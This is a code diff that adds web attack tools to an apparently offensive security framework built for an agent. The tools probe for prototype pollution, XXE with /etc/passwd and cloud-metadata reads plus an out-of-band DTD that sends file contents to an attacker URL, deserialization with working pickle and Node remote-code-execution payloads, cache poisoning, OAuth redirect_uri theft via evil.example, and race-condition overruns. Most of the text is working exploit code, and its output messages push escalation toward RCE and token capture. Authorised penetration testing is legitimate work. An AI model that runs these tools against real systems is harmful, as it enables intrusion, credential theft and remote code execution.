@@ -555,3 +555,456 @@ class SmuggleProbeTool(_WebToolBase):
             "timing detection has false negatives behind aggressive normalizers - a "
             "differential-response test is the follow-up.",
             metadata={"host": host, "vulnerable": []})
+
+
+# --------------------------------------------------------------------------- #
+# Prototype pollution (server-side)
+# --------------------------------------------------------------------------- #
+
+class ProtoPollutionTool(_WebToolBase):
+    """Probe a JSON endpoint for server-side prototype pollution: inject __proto__ /
+    constructor.prototype gadgets and detect a reflected/behavioural change (a polluted
+    global property leaking into a later response, a new error, or a status change)."""
+
+    name = "proto_pollution"
+    description = (
+        "Test a JSON endpoint for SERVER-SIDE prototype pollution (Node/JS backends). "
+        "Sends __proto__ and constructor.prototype gadgets merged into the body, then a "
+        "benign read, and flags a polluted property leaking into the response, a new 500, "
+        "or a status/length change vs baseline. Give `url`, `body` (valid JSON), optional "
+        "`read_url` to check for the leaked gadget afterwards."
+    )
+    parameters = {
+        "type": "object",
+        "properties": {
+            "url": {"type": "string", "description": "JSON endpoint that merges the body."},
+            "body": {"type": "object", "description": "A valid baseline JSON body."},
+            "read_url": {"type": "string", "description": "Optional GET to check for the polluted gadget."},
+        },
+        "required": ["url"],
+    }
+    permissions = {Permission.NETWORK}
+    timeout = 30
+    tags = ["web", "prototype-pollution", "exploit"]
+
+    _MARKER = "pp_polluted_9147"
+
+    def _gadgets(self) -> list:
+        return [
+            {"__proto__": {"pp": self._MARKER}},
+            {"constructor": {"prototype": {"pp": self._MARKER}}},
+            {"__proto__": {"status": 510}},
+        ]
+
+    async def execute(self, url: str, body: Optional[dict] = None,
+                      read_url: str = "", **kwargs: Any) -> ToolResult:
+        url = (url or "").strip()
+        if not url:
+            return ToolResult.fail("proto_pollution: 'url' is required")
+        base = dict(body or {})
+        rows: list[str] = []
+        hit = False
+        try:
+            async with self._client() as client:
+                b = await client.post(url, json=base, extra_headers={"User-Agent": _UA})
+                b_sig = (b.status_code, len(b.text or ""))
+                for g in self._gadgets():
+                    payload = {**base, **g}
+                    resp = await client.post(url, json=payload, extra_headers={"User-Agent": _UA})
+                    leaked = self._MARKER in (resp.text or "")
+                    changed = (resp.status_code, len(resp.text or "")) != b_sig
+                    check = ""
+                    if read_url and not leaked:
+                        r2 = await client.get(read_url, extra_headers={"User-Agent": _UA})
+                        if self._MARKER in (r2.text or ""):
+                            leaked, check = True, " (leaked into read_url)"
+                    mark = ""
+                    if leaked:
+                        mark, hit = f"  <-- POLLUTED: gadget reflected{check}", True
+                    elif changed and resp.status_code >= 500:
+                        mark, hit = "  <-- server error after gadget (possible pollution)", True
+                    rows.append(f"  {json.dumps(g)[:46]:48} -> status={resp.status_code} "
+                                f"len={len(resp.text or '')}{mark}")
+        except Exception as exc:
+            return ToolResult.fail(f"proto_pollution: request failed - {exc}")
+
+        header = f"proto_pollution - {url}\n" + "\n".join(rows)
+        if hit:
+            return ToolResult.ok(
+                header + "\n\nLIKELY SERVER-SIDE PROTOTYPE POLLUTION: a gadget changed a "
+                "global property. Escalate with a framework-specific gadget toward RCE or "
+                "auth bypass.", metadata={"url": url, "polluted": True})
+        return ToolResult.ok(header + "\n\nNo prototype-pollution signal (backend may not "
+                             "be JS, or it clones/sanitizes the merge).",
+                             metadata={"url": url, "polluted": False})
+
+
+# --------------------------------------------------------------------------- #
+# XXE
+# --------------------------------------------------------------------------- #
+
+class XxeTool(_WebToolBase):
+    """XML External Entity injection: submit XXE payloads (file read, SSRF, PHP wrapper,
+    and a blind/OOB external-DTD stub) to an XML endpoint and detect a leaked file or an
+    internal fetch."""
+
+    name = "xxe_tool"
+    description = (
+        "Test an XML endpoint for XXE. POSTs file-read (file:///etc/passwd), PHP base64 "
+        "wrapper, and SSRF (IMDS) entity payloads and flags leaked file content or an "
+        "internal fetch; also returns an out-of-band blind stub (external DTD). Give "
+        "`url`; set `file` for a specific path and `oob_url` for a blind collaborator."
+    )
+    parameters = {
+        "type": "object",
+        "properties": {
+            "url": {"type": "string", "description": "The XML-consuming endpoint."},
+            "file": {"type": "string", "description": "File to read (default /etc/passwd).", "default": "/etc/passwd"},
+            "oob_url": {"type": "string", "description": "Optional attacker URL for a blind external DTD."},
+        },
+        "required": ["url"],
+    }
+    permissions = {Permission.NETWORK}
+    timeout = 30
+    tags = ["web", "xxe", "exploit"]
+
+    async def execute(self, url: str, file: str = "/etc/passwd", oob_url: str = "",
+                      **kwargs: Any) -> ToolResult:
+        url = (url or "").strip()
+        if not url:
+            return ToolResult.fail("xxe_tool: 'url' is required")
+        file = file or "/etc/passwd"
+        payloads = [
+            ("file-read",
+             f'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file://{file}">]>'
+             f'<r>&xxe;</r>', r"root:x:0:0:"),
+            ("php-b64",
+             '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM '
+             f'"php://filter/convert.base64-encode/resource={file}">]><r>&xxe;</r>',
+             r"[A-Za-z0-9+/]{40,}={0,2}"),
+            ("ssrf-imds",
+             '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM '
+             '"http://169.254.169.254/latest/meta-data/">]><r>&xxe;</r>',
+             r"(?i)ami-id|instance-id|iam|security-credentials"),
+        ]
+        hits: list[str] = []
+        try:
+            async with self._client() as client:
+                for label, body, sig in payloads:
+                    resp = await client.request(
+                        "POST", url, content=body,
+                        extra_headers={"Content-Type": "application/xml", "User-Agent": _UA})
+                    m = re.search(sig, resp.text or "")
+                    if m:
+                        snip = (resp.text or "")[max(0, m.start() - 10):m.start() + 100].strip()
+                        hits.append(f"  [{label}] status={resp.status_code} leaked: …{snip}…")
+        except Exception as exc:
+            if not hits:
+                return ToolResult.fail(f"xxe_tool: request failed - {exc}")
+
+        oob = ""
+        if oob_url:
+            oob = ("\n\nBLIND/OOB - host this external DTD and reference it:\n"
+                   f'  in-band ref: <!DOCTYPE r [<!ENTITY % ext SYSTEM "{oob_url}/e.dtd">%ext;]>\n'
+                   f'  e.dtd: <!ENTITY % f SYSTEM "file://{file}"><!ENTITY % all '
+                   f'"<!ENTITY send SYSTEM \'{oob_url}/?x=%f;\'>">%all;')
+        if hits:
+            return ToolResult.ok(
+                "xxe_tool: XXE CONFIRMED - the parser resolved an external entity:\n"
+                + "\n".join(hits) + oob, metadata={"url": url, "xxe": True})
+        return ToolResult.ok(
+            f"xxe_tool: no in-band XXE leak on {url} (parser may block external entities)."
+            + oob, metadata={"url": url, "xxe": False})
+
+
+# --------------------------------------------------------------------------- #
+# Insecure deserialization (offline payload generator)
+# --------------------------------------------------------------------------- #
+
+class DeserializeGadgetTool(BaseTool):
+    """Generate insecure-deserialization payloads / gadget guidance: Python pickle (a
+    working RCE), Node node-serialize, PHP object-injection + phar, Java (ysoserial
+    gadget selection), .NET Json.NET TypeNameHandling. Offline."""
+
+    name = "deserialize_gadget"
+    description = (
+        "Generate an insecure-deserialization payload for a language: 'python' (working "
+        "pickle RCE), 'node' (node-serialize IIFE), 'php' (object-injection + phar), "
+        "'java' (which ysoserial gadget), '.net' (Json.NET ObjectDataProvider). Give "
+        "`lang` and the `cmd` to run. Offline - send the output at the deserialization sink."
+    )
+    parameters = {
+        "type": "object",
+        "properties": {
+            "lang": {"type": "string", "enum": ["python", "node", "php", "java", ".net"],
+                     "description": "Target language/serializer."},
+            "cmd": {"type": "string", "description": "Command to execute (default 'id').", "default": "id"},
+        },
+        "required": ["lang"],
+    }
+    permissions: set = set()
+    tags = ["web", "deserialization", "rce"]
+
+    async def execute(self, lang: str, cmd: str = "id", **kwargs: Any) -> ToolResult:
+        import base64 as _b64
+        lang = (lang or "").lower().strip()
+        cmd = cmd or "id"
+        if lang == "python":
+            import pickle
+            import os as _os
+
+            class _R:
+                def __reduce__(self):
+                    return (_os.system, (cmd,))
+            b64 = _b64.b64encode(pickle.dumps(_R())).decode()
+            return ToolResult.ok(
+                "Python pickle RCE payload (base64) - the sink runs os.system on load:\n"
+                f"  {b64}\n\nUse at any pickle.loads()/yaml.load(Loader=Loader)/jsonpickle "
+                "sink.", metadata={"lang": "python"})
+        if lang == "node":
+            payload = ('{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\')'
+                       f'.exec(\'{cmd}\');}}()"}}')
+            return ToolResult.ok(
+                "Node node-serialize RCE (IIFE runs on unserialize):\n  " + payload,
+                metadata={"lang": "node"})
+        if lang == "php":
+            return ToolResult.ok(
+                "PHP object injection / phar:\n"
+                "  - Object injection: O:<len>:\"Class\":<n>:{...} matching a class with a "
+                "dangerous __wakeup/__destruct (build a POP chain).\n"
+                f"  - phar:// deserialization: craft a phar whose metadata is a POP-chain "
+                f"object running {cmd!r}; trigger via a filesystem func on phar://.",
+                metadata={"lang": "php"})
+        if lang == "java":
+            return ToolResult.ok(
+                "Java deserialization - pick the ysoserial gadget for the classpath:\n"
+                "  CommonsCollections1-7, CommonsBeanutils1, Spring1/2, Groovy1, "
+                "Hibernate1, JRMPClient (OOB), URLDNS (blind detect).\n"
+                f"  java -jar ysoserial.jar <GADGET> {cmd!r} | base64  -> ObjectInputStream "
+                "sink. Detect first with URLDNS.", metadata={"lang": "java"})
+        if lang == ".net":
+            return ToolResult.ok(
+                ".NET Json.NET with TypeNameHandling != None:\n"
+                "  {\"$type\":\"System.Windows.Data.ObjectDataProvider,...\",...}  "
+                f"(ysoserial.net -f Json.Net -g ObjectDataProvider -c \"{cmd}\").",
+                metadata={"lang": ".net"})
+        return ToolResult.fail("deserialize_gadget: lang must be python|node|php|java|.net")
+
+
+# --------------------------------------------------------------------------- #
+# Web cache poisoning
+# --------------------------------------------------------------------------- #
+
+class CachePoisonTool(_WebToolBase):
+    """Probe for web cache poisoning: send unkeyed headers (X-Forwarded-Host, X-Host, ...)
+    with a marker + cache-buster and flag any reflected into a CACHEABLE response."""
+
+    name = "cache_poison"
+    description = (
+        "Probe for web cache poisoning. Sends unkeyed headers (X-Forwarded-Host, X-Host, "
+        "X-Forwarded-Scheme, X-Original-URL, ...) with a marker + cache-buster and flags "
+        "any reflected into a response that also looks cacheable (Cache-Control public / "
+        "Age / X-Cache) - the setup for poisoning the shared cache. Give `url`."
+    )
+    parameters = {
+        "type": "object",
+        "properties": {"url": {"type": "string", "description": "The (ideally cached) URL."}},
+        "required": ["url"],
+    }
+    permissions = {Permission.NETWORK}
+    timeout = 30
+    tags = ["web", "cache-poisoning", "misconfig"]
+
+    _HEADERS = ["X-Forwarded-Host", "X-Host", "X-Forwarded-Scheme", "X-Forwarded-Server",
+                "X-Original-URL", "X-Rewrite-URL", "X-Forwarded-Prefix"]
+    _MARK = "cpwn9147.evil"
+
+    async def execute(self, url: str, **kwargs: Any) -> ToolResult:
+        url = (url or "").strip()
+        if not url:
+            return ToolResult.fail("cache_poison: 'url' is required")
+        rows: list[str] = []
+        candidates: list[str] = []
+        try:
+            async with self._client() as client:
+                for hdr in self._HEADERS:
+                    sep = "&" if "?" in url else "?"
+                    resp = await client.get(url + sep + f"cb={int(time.time()*1000)}{hdr}",
+                                            extra_headers={hdr: self._MARK, "User-Agent": _UA})
+                    body = resp.text or ""
+                    h = {k.lower(): v for k, v in (resp.headers or {}).items()}
+                    reflected = self._MARK in body
+                    cacheable = ("public" in h.get("cache-control", "").lower()
+                                 or "age" in h or "x-cache" in h)
+                    mark = ""
+                    if reflected and cacheable:
+                        mark = "  <-- REFLECTED into a CACHEABLE response (poisoning candidate)"
+                        candidates.append(hdr)
+                    elif reflected:
+                        mark = "  <-- reflected (confirm it caches)"
+                    rows.append(f"  {hdr:22} -> reflected={reflected} cacheable={cacheable}{mark}")
+        except Exception as exc:
+            return ToolResult.fail(f"cache_poison: request failed - {exc}")
+
+        header = f"cache_poison - {url}\n" + "\n".join(rows)
+        if candidates:
+            return ToolResult.ok(
+                header + "\n\nCACHE POISONING CANDIDATE (" + ", ".join(candidates) + "): "
+                "unkeyed AND reflected into a cacheable response. Poison it (e.g. "
+                "X-Forwarded-Host -> your host to hijack absolute script URLs), then "
+                "confirm a cache HIT serves it to others.",
+                metadata={"url": url, "candidates": candidates})
+        return ToolResult.ok(header + "\n\nNo unkeyed-header reflection into a cacheable "
+                             "response.", metadata={"url": url, "candidates": []})
+
+
+# --------------------------------------------------------------------------- #
+# OAuth / open redirect
+# --------------------------------------------------------------------------- #
+
+class OauthProbeTool(_WebToolBase):
+    """Probe a redirect/authorize URL for open-redirect and OAuth redirect_uri bypass: a
+    redirect the server follows to an attacker origin leaks the auth code/token."""
+
+    name = "oauth_probe"
+    description = (
+        "Test a redirect/authorize URL for open-redirect and OAuth redirect_uri bypass. "
+        "Rewrites the redirect target with attacker payloads (host swap, subdomain, "
+        "@userinfo, //evil, backslash, traversal) and flags a 3xx Location (or reflected "
+        "redirect) to the attacker origin. Give `url` and the `param` holding the redirect "
+        "(redirect_uri/redirect/next/returnUrl/callback)."
+    )
+    parameters = {
+        "type": "object",
+        "properties": {
+            "url": {"type": "string", "description": "The authorize/redirect URL."},
+            "param": {"type": "string", "description": "The redirect param."},
+        },
+        "required": ["url", "param"],
+    }
+    permissions = {Permission.NETWORK}
+    timeout = 30
+    tags = ["web", "oauth", "open-redirect"]
+
+    _EVIL = "evil.example"
+
+    def _payloads(self, url: str, param: str) -> list:
+        legit = dict(urllib.parse.parse_qsl(urllib.parse.urlsplit(url).query)).get(param, "")
+        host = urllib.parse.urlsplit(legit or "https://target").netloc or "target"
+        e = self._EVIL
+        return [
+            ("whole-swap", f"https://{e}/cb"),
+            ("subdomain", f"https://{host}.{e}/cb"),
+            ("userinfo", f"https://{host}@{e}/cb"),
+            ("protocol-relative", f"//{e}/cb"),
+            ("backslash", f"https://{e}\\@{host}/cb"),
+            ("traversal", f"https://{host}/../../{e}"),
+        ]
+
+    async def execute(self, url: str, param: str, **kwargs: Any) -> ToolResult:
+        url = (url or "").strip()
+        param = (param or "").strip()
+        if not url or not param:
+            return ToolResult.fail("oauth_probe: 'url' and 'param' are required")
+        rows: list[str] = []
+        vulns: list[str] = []
+        try:
+            async with HttpClient(timeout=12.0, proxy=self._proxy(),
+                                  cookies=getattr(self.session, "cookies", None),
+                                  headers={"User-Agent": _UA}, verify_ssl=False,
+                                  follow_redirects=False) as client:
+                for label, payload in self._payloads(url, param):
+                    resp = await client.get(self._inject(url, param, payload),
+                                            extra_headers={"User-Agent": _UA})
+                    loc = {k.lower(): v for k, v in (resp.headers or {}).items()}.get("location", "")
+                    to_evil = self._EVIL in loc
+                    reflected = self._EVIL in (resp.text or "")[:4000]
+                    mark = ""
+                    if to_evil:
+                        mark, _ = f"  <-- OPEN REDIRECT: Location -> {loc[:50]}", vulns.append(label)
+                    elif reflected:
+                        mark = "  <-- payload reflected (client-side redirect?)"
+                    rows.append(f"  {label:18} -> {resp.status_code} "
+                                f"loc={loc[:32] or '(none)'}{mark}")
+        except Exception as exc:
+            return ToolResult.fail(f"oauth_probe: request failed - {exc}")
+
+        header = f"oauth_probe - {url} (param={param})\n" + "\n".join(rows)
+        if vulns:
+            return ToolResult.ok(
+                header + "\n\nREDIRECT_URI / OPEN REDIRECT ACCEPTED (" + ", ".join(vulns) +
+                "): redirects to the attacker origin. In OAuth this leaks the code/token "
+                "(set redirect_uri to your server, capture the code, exchange it).",
+                metadata={"url": url, "vulnerable": vulns})
+        return ToolResult.ok(header + "\n\nNo open-redirect / redirect_uri bypass observed.",
+                             metadata={"url": url, "vulnerable": []})
+
+
+# --------------------------------------------------------------------------- #
+# Race condition
+# --------------------------------------------------------------------------- #
+
+class RaceProbeTool(_WebToolBase):
+    """Probe for a race condition (limit-overrun / TOCTOU): fire N identical requests
+    near-simultaneously and detect more successes than a single-use action should allow."""
+
+    name = "race_probe"
+    description = (
+        "Test for a race condition by firing N identical requests near-simultaneously and "
+        "reporting the response spread. More 2xx successes than the logic should allow "
+        "(coupon reuse, double-spend, one-time-token replay) indicates an exploitable "
+        "race. Give `url`, `method` (POST/GET), `body` (JSON), `count` (default 20)."
+    )
+    parameters = {
+        "type": "object",
+        "properties": {
+            "url": {"type": "string", "description": "The action endpoint."},
+            "method": {"type": "string", "enum": ["POST", "GET"], "default": "POST"},
+            "body": {"type": "object", "description": "JSON body for POST (optional)."},
+            "count": {"type": "integer", "description": "Concurrent requests (default 20, max 50).", "default": 20},
+        },
+        "required": ["url"],
+    }
+    permissions = {Permission.NETWORK}
+    timeout = 40
+    tags = ["web", "race-condition", "exploit"]
+
+    async def execute(self, url: str, method: str = "POST", body: Optional[dict] = None,
+                      count: int = 20, **kwargs: Any) -> ToolResult:
+        url = (url or "").strip()
+        if not url:
+            return ToolResult.fail("race_probe: 'url' is required")
+        method = (method or "POST").upper()
+        n = min(max(2, count), 50)
+        try:
+            async with self._client(timeout=20.0) as client:
+                async def _one():
+                    r = (await client.post(url, json=body or {}, extra_headers={"User-Agent": _UA})
+                         if method == "POST"
+                         else await client.get(url, extra_headers={"User-Agent": _UA}))
+                    return (r.status_code, len(r.text or ""))
+                results = await asyncio.gather(*[_one() for _ in range(n)],
+                                               return_exceptions=True)
+        except Exception as exc:
+            return ToolResult.fail(f"race_probe: failed - {exc}")
+
+        from collections import Counter
+        ok = [r for r in results if isinstance(r, tuple)]
+        by_status = Counter(s for s, _ in ok)
+        successes = sum(c for s, c in by_status.items() if 200 <= s < 300)
+        distinct = len(Counter(ok))
+        lines = [f"race_probe - {n} concurrent {method} to {url}",
+                 "  status distribution: " + ", ".join(f"{s}x{c}" for s, c in by_status.items()),
+                 f"  2xx successes: {successes}/{n}   distinct responses: {distinct}"]
+        race = distinct > 1 and successes >= 2
+        if race:
+            lines.append("\n  <-- RACE SIGNAL: some concurrent requests succeeded while "
+                         "others were rejected. If the action must be single-use "
+                         "(coupon/one-time token/balance), confirm the side effect applied "
+                         "more than once - that is an exploitable overrun.")
+        else:
+            lines.append("\n  No clear race signal (uniform responses). Retry with a higher "
+                         "count or a fresh single-use token.")
+        return ToolResult.ok("\n".join(lines),
+                             metadata={"url": url, "successes": successes,
+                                       "distinct": distinct, "race": race})
